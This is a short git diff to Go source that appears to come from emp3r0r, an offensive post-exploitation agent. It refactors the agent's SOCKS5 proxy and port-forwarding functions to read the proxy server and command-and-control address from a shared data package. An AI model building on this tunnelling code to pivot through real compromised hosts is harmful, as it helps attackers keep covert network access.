@@ -10,6 +10,7 @@ import (
 	"sync"
 	"time"
 
+	emp3r0r_data "github.com/jm33-m0/emp3r0r/core/lib/data"
 	"github.com/jm33-m0/emp3r0r/core/lib/tun"
 	"github.com/jm33-m0/emp3r0r/core/lib/util"
 	"github.com/posener/h2conn"
@@ -39,21 +40,21 @@ func Socks5Proxy(op string, addr string) (err error) {
 	switch op {
 	case "on":
 		go func() {
-			err = tun.StartSocks5Proxy(addr, ProxyServer)
+			err = tun.StartSocks5Proxy(addr, emp3r0r_data.ProxyServer)
 			if err != nil {
 				log.Printf("StartSock5Proxy: %v", err)
 			}
 		}()
 	case "off":
 		log.Print("Stopping Socks5Proxy")
-		if ProxyServer == nil {
+		if emp3r0r_data.ProxyServer == nil {
 			return errors.New("Proxy server is not running")
 		}
-		err = ProxyServer.Shutdown()
+		err = emp3r0r_data.ProxyServer.Shutdown()
 		if err != nil {
 			log.Print(err)
 		}
-		ProxyServer = nil
+		emp3r0r_data.ProxyServer = nil
 	default:
 		return errors.New("Operation not supported")
 	}
@@ -78,7 +79,7 @@ func PortFwd(addr, sessionID string, reverse bool) (err error) {
 	var (
 		session PortFwdSession
 
-		url = CCAddress + tun.ProxyAPI + "/" + sessionID
+		url = emp3r0r_data.CCAddress + tun.ProxyAPI + "/" + sessionID
 
 		// connection
 		conn   *h2conn.Conn
@@ -134,7 +135,7 @@ func PortFwd(addr, sessionID string, reverse bool) (err error) {
 func listenAndFwd(ctx context.Context, cancel context.CancelFunc,
 	port, sessionID string) {
 	var (
-		url = CCAddress + tun.ProxyAPI + "/" + sessionID
+		url = emp3r0r_data.CCAddress + tun.ProxyAPI + "/" + sessionID
 		err error
 	)
 
